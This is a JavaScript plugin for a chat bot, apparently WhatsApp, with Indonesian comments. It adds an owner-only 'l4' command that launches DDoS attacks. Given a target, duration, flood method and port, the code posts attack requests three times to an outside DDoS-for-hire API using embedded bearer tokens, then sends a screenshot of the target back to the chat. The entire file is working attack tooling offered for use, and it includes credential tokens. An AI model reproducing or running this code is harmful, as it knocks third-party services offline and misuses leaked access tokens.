/*
『NOTICE』 Hak cipta dilindungi.
* Script ini dibuat oleh Obscura
* Gunakan dengan bijak.
* Telegram: https://t.me/DelioGalileio
*/

/* 
*/
import fetch from "node-fetch";
import cp, { exec as _exec } from "child_process";
import { promisify } from "util";

const exec = promisify(_exec).bind(cp);
const cooldowns = new Map();

let isAttacking = false; // Status global untuk melacak apakah ada serangan yang sedang berlangsung

// Daftar metode yang valid untuk L4
const validMethods = ['gre', 'act', 'stomp', 'socket', 'handshake', 'udp'];

let handler = async (m, { conn, command, args }) => {
  if (!args[0]) return conn.reply(m.chat, "*[🔎] Where's The Target?*\nMetods\n" + validMethods.join('\n> '), m);
  if (!args[1]) return conn.reply(m.chat, "*[🔎] Where's The Timeout? *", m);
  if (!args[2]) return conn.reply(m.chat, "*[🔎] Where's The Method? *", m);

  // Cek apakah metode yang diberikan valid
  if (!validMethods.includes(args[2])) {
    return conn.reply(m.chat, `❌ Invalid method! Use one of the following methods: ${validMethods.join(', ')}`, m);
  }

  // Jika metode bukan 'gre', maka butuh argumen port
  if (args[2] !== 'gre' && !args[3]) {
    return conn.reply(m.chat, "*[🔎] Where's The Port? *", m);
  }

  const user = m.sender;
  const cooldownTime = 60 * 1000; // 60 seconds cooldown

  // Cek apakah serangan sedang berlangsung
  if (isAttacking) {
    return conn.reply(m.chat, `⚠️ A DDoS attack is currently in progress. Please wait until it's finished.`, m);
  }

  // Mulai serangan, set isAttacking ke true
  isAttacking = true;

  const hackerIntro = `*DDoS Attack Started* 🛡️\n\n*Target:* ${args[0]}\n*Timeout:* ${args[1]} seconds\n*Method:* ${args[2]}\n${args[2] !== 'gre' ? `*Port:* ${args[3]}\n` : ''}*Check Link:*\nhttps://check-host.net/check-http?host=${args[0]}&csrf_token=5b0f02bb3740ee3e4d5da86a86022cf524706bd3`;
  const hackerOutro = "DDoS attack completed. Initiating screenshot...";

  await m.reply(`\`\`\`${hackerIntro}\`\`\``); // Reply with hacker-like execution confirmation

  let o;
  try {
    // Mempersiapkan body untuk request
    const attackBody = {
      attack: {
        method: args[2], // Custom method
        category: "L4",  // L4 attack
        time: parseInt(args[1]), // Custom time
        parameters: {
          target: args[0], // Custom target
          time: args[1],
          ...(args[2] !== 'gre' && { ports: args[3] }) // Port hanya disertakan jika metode bukan 'gre'
        }
      }
    };

    // Execute the DDoS attack with fetch API and custom method/time/port
    const response = await fetch('https://overload.su/api/attack', {
      method: 'POST',
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MzQwLCJ0b2tlbiI6IjkwNTRiZWVmLTgwMWQtNDI0OS05ODUzLTI1Zjc4NWY0YmY0NCIsImlwIjoiMTgwLjI0MS4xNi4yMDEiLCJpYXQiOjE3MjgyODEyNzQsImV4cCI6MTcyODYyNjg3NH0.bqQ1632JCuxoUmFNL6ZeSw9fYeP9Km_XgRLMC5S77sc',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'Referer': 'https://overload.su/panel'
      },
      body: JSON.stringify(attackBody)
    });
    await fetch('https://overload.su/api/attack', {
      method: 'POST',
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MzM5LCJ0b2tlbiI6ImZmYWU5OGM1LWJlNzktNDFmMi1iYTZlLWRlNWFmM2ZhYzg4NiIsImlwIjoiMTgwLjI0MS4xNi4yMDEiLCJpYXQiOjE3MjgyODA4NTYsImV4cCI6MTcyODYyNjQ1Nn0.KnYF2gaDacdOs-FII1A9XiOQNMUgKjZ-DoskROQvu9Y',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'Referer': 'https://overload.su/panel'
      },
      body: JSON.stringify(attackBody)
    });
    await fetch('https://overload.su/api/attack', {
      method: 'POST',
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MzQwLCJ0b2tlbiI6IjkwNTRiZWVmLTgwMWQtNDI0OS05ODUzLTI1Zjc4NWY0YmY0NCIsImlwIjoiMTgwLjI0MS4xNi4yMDEiLCJpYXQiOjE3MjgyODEyNzQsImV4cCI6MTcyODYyNjg3NH0.bqQ1632JCuxoUmFNL6ZeSw9fYeP9Km_XgRLMC5S77sc',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'Referer': 'https://overload.su/panel'
      },
      body: JSON.stringify(attackBody)
    });

    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    const result = await response.json();
    console.log(result);

    // Menunggu waktu sesuai dengan timeout yang diberikan
    await new Promise((resolve) => setTimeout(resolve, parseInt(args[1]) * 1000)); // Konversi detik ke milidetik
  } catch (e) {
    o = e;
  } finally {
    // Display the output of the DDoS attack
    m.reply(`\`\`\`${hackerOutro}\`\`\``);

    // Capture a screenshot of the URL and send it
    let ss = await (
      await fetch(`https://image.thum.io/get/fullpage/http://${args[0]}`)
    ).buffer();
    conn.sendFile(m.chat, ss, "screenshot.png", args[0]);

    // Set cooldown for the user
    cooldowns.set(user, Date.now() + cooldownTime);

    // Set isAttacking ke false setelah serangan selesai
    isAttacking = false;
  }
};

handler.help = ["l4"].map((v) => v + " <target> <timeout> <method> <port>");
handler.tags = ["owner"];

handler.command = /^(l4)$/i;
handler.owner = true;

export default handler;